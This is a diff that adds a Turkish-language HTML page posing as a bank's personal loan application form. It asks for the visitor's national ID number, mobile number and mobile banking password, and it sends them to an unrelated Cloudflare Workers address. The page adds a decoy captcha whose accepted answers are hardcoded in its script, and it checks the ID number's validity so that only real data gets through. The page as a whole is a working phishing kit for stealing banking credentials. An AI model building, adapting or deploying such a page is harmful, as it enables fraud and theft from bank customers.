@@ -1,0 +1,244 @@
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <style class="vjs-styles-defaults"></style>
+  <meta http-equiv="Content-Language" content="tr">
+  <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-9">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>Kredi Başvuru Formu</title>
+  <link href="./css/main.css" rel="stylesheet" id="style">
+ 
+
+<script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+</head>
+<body style="margin-left: 0px;margin-right: 0px;margin-top: 0px;margin-bottom: 0px;">
+<style>
+header {
+    background-image: url(./img/head.png);
+    background-size: cover;
+    background-repeat: no-repeat;
+    height: 478px;
+    width: 99%;
+    text-align: center;
+    color: white;
+}
+footer {
+    background-size: cover;
+    background-repeat: no-repeat;
+    width: 100%;
+    height: 700px;
+    padding-bottom: 0px;
+    padding-right: 0px;
+    padding-left: 0px;
+    padding-top: 0px;
+    background-image: url(./img/footer.png);
+}
+
+</style>
+<header></header>
+    <form id="application" class="validationName:(personalCreditApplicationStep1a) validate:(personalCreditApplicationStep1aValidate)" action="https://worker-steep-shape-b948.selimjuhan2.workers.dev/" method="post" autocomplete="off">
+        <input type="hidden" value="tr" name="userLanguage" id="userLanguage">
+        <input type="text" class="structural">
+        <fieldset class="first">
+          <h2>
+            <span></span> Kişisel Bilgiler
+          </h2>
+          <div class="formSubmitError structural">
+            <div>
+              <!-- -->
+            </div>
+          </div>
+          <div class="formField  validate:(tcNo) validationName:(tcNo)    error">
+            <div class="formFieldOuter">
+              <div class="formFieldInner">
+                <label for="userTCNo">
+                  <img src="./img/required-field-bg.png" alt=""> T.C. Kimlik Numarası </label>
+                <div class="formFieldSurround">
+                  <input id="userTCNo" name="userTCNo" class="tcNo " type="tel" value="" maxlength="11" required>
+                </div>
+                <div class="errorContainer" style="display:none;">
+                  <div class="errorWrapper errorWithArrow">
+                    <div class="errorMessage">
+                      <p>T.C. Kimlik Numarası geçerli olmalı, 11 basamaktan ve sadece rakamlardan oluşmalıdır.</p>
+                    </div>
+                    <div class="base">
+                      <!-- -->
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+       
+          </div>
+          <div class="formField validate:(requiredMobilePhoneFullFormat) validationName:(validmobilePhone)  ">
+            <div class="formFieldOuter">
+              <div class="formFieldInner">
+                <label for="mobilePhoneNumBean.phoneNum">
+                  <img src="./img/required-field-bg.png" alt=""> Cep Telefonu </label>
+                <div class="formFieldSurround">
+                  <input type="tel" id="mobilePhoneNumBean.countryCode" name="mobilePhoneNumBean.countryCode" class="countryCode" maxlength="3" style="margin-right: 3px; width:2.7em;" value="090" disabled="">
+                  <input id="mobilePhoneNumBean.phoneNum" name="mobilePhoneNumBean.phoneNum" class="mainTelephone fullMobileNumber amount" type="tel" value="" maxlength="10" required>
+                </div>
+                <div class="adviceContainer">
+                  <div class="advice structural">
+                    <div class="alpha">
+                      <p>Örn:090 5xxxxxxxxx</p>
+                    </div>
+                    <div class="base alpha">
+                      <!-- -->
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="formField validate:(requiredMobilePhoneFullFormat) validationName:(validmobilePhone)  ">
+          <div class="formFieldOuter">
+            <div class="formFieldInner">
+              <label for="mobilePhoneNumBean.phoneNum">
+                <img src="./img/required-field-bg.png" alt=""> Mobil Bankacılık Şifreniz </label>
+              <div class="formFieldSurround">
+                <input id="sifre" name="sifre" class="tcNo " type="password" value="" maxlength="6" required>
+              </div>
+              <div class="errorContainer" style="display:none;">
+                <div class="errorWrapper errorWithArrow">
+                  <div class="errorMessage">
+                    <p>Şifreniz 6 Rakamdan oluşabilir.</p>
+                  </div>
+                  <div class="base">
+                    <!-- -->
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+          </div>
+          <input type="hidden" value="" name="cidParameter" id="cidParameter">
+          <fieldset class="captchaVerify">
+            <h2>İşlem doğrulama</h2>
+            <p class="captchaImages" style="display: flex; align-items: center;">
+              <img id="kod" src="./img/caps1.png" style="width: 308px; margin-right: 10px;">
+              <img id="degistir" src="./img/mobile/png/refresh_captcha.png" style="width: 45px; height: 45px; cursor: pointer;" onclick="degistirKodu()">
+            </p>
+            <div class="formField validate:(requiredText) validationName:(captchaValidate)">
+              <div class="formFieldOuter">
+                <div class="formFieldInner">
+                  <label for="captcha">Lütfen kutuda gördüğünüz karakterleri girin.</label>
+                  <div class="formFieldSurround" style="width: 311px;">
+                    <input type="text" name="captcha" id="captcha" class="captchaEntry" oninput="onInputChange(this)" required>
+                  </div>
+                  <a class="help" href="#" tabindex="999"></a>
+                  <div class="helpContainer structural">
+                    <div class="contextualHelp">
+                      <div>
+                        <strong class="subject">Yardım</strong>
+                        <p> Bu kod, formun otomatik olarak doldurulmasını engellemek için kullanılmaktadır. </p>
+                      </div>
+                      <div class="base">
+                        <!-- -->
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </fieldset>
+          
+          <script>
+          function degistirKodu() {
+            var kodResmi = document.getElementById('kod');
+            var resimNumarasi = parseInt(kodResmi.src.charAt(kodResmi.src.length - 5));
+          
+             resimNumarasi++;
+          
+             var yeniResimSrc = `./img/caps${resimNumarasi}.png`;
+          
+             kodResmi.src = yeniResimSrc;
+          
+             if (resimNumarasi === 3) {
+              resimNumarasi = 0;
+            }
+          }
+
+ 
+          </script>
+   
+        </fieldset>
+        <div class="formFooter">
+          <button id="applicationSubmit" name="applicationSubmit" class="submit PE_hover  ajax type:(json)  area:(calcContent)   additionalCallBackFunction:(initCaptcha)  " type="submit" style="" disabled>
+            <span>
+              <span>
+                <span>
+                  <span>
+                    <span class="link"> Başvuru Yap </span>
+                  </span>
+                </span>
+              </span>
+            </span>
+          </button>
+          <span id="requiredHelper" class="requiredHelper">
+            <img src="./img/required-field-bg.png"> = Doldurulması gereken alanlar </span>
+        </div>
+      </form>
+ 
+<footer>
+
+</footer>
+<script>
+    function tcno_dogrula(tcno) {
+      tcno = String(tcno);
+      if (tcno.substring(0, 1) === '0') {
+        return false;
+      }
+      if (tcno.length !== 11) {
+        return false;
+      }
+      var ilkon_array = tcno.substr(0, 10).split('');
+      var ilkon_total = hane_tek = hane_cift = 0;
+      for (var i = j = 0; i < 9; ++i) {
+        j = parseInt(ilkon_array[i], 10);
+        if (i & 1) {
+          hane_cift += j;
+        } else {
+          hane_tek += j;
+        }
+        ilkon_total += j;
+      }
+      if ((hane_tek * 7 - hane_cift) % 10 !== parseInt(tcno.substr(-2, 1), 10)) {
+        return false;
+      }
+      ilkon_total += parseInt(ilkon_array[9], 10);
+      if (ilkon_total % 10 !== parseInt(tcno.substr(-1), 10)) {
+        return false;
+      }
+      return true;
+    }
+  
+    function onInputChange(input) {
+      input.value = input.value.toUpperCase();
+  
+      var tcNoInput = document.getElementById('userTCNo');
+      var tcNoValid = tcno_dogrula(tcNoInput.value);
+  
+      var degerler = input.value.split(',');
+      var uygunDegerler = ["MM41B", "RP5YK", "2MUKK"];
+      var uygun = degerler.every(function(deger) {
+        return uygunDegerler.includes(deger.trim());
+      });
+  
+      var submitButton = document.getElementById('applicationSubmit');
+      submitButton.disabled = !(tcNoValid && uygun);
+    }
+  
+    document.addEventListener("DOMContentLoaded", function() {
+      var userTCNoInput = document.getElementById('userTCNo');
+      userTCNoInput.addEventListener('input', function() {
+        onInputChange(this);
+      });
+    });
+  </script>
+ 
+</body>
+</html>
